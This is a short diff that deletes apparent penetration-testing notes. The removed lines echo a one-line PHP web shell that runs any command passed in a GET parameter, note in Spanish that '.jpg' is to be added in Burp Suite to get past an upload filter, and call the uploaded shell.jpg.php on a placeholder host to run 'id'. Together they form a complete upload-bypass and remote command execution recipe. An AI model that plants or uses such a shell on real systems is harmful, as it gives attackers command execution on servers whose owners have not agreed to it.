@@ -1,5 +1,0 @@
-
-
-::: echo '<?php system($_GET["mochiMango"]); ?>' > shell.php								"agrega el .jpg en burpsuite"
-
-firefox::: https://test.test/uploads/images/shell.jpg.php?mochiMango=id
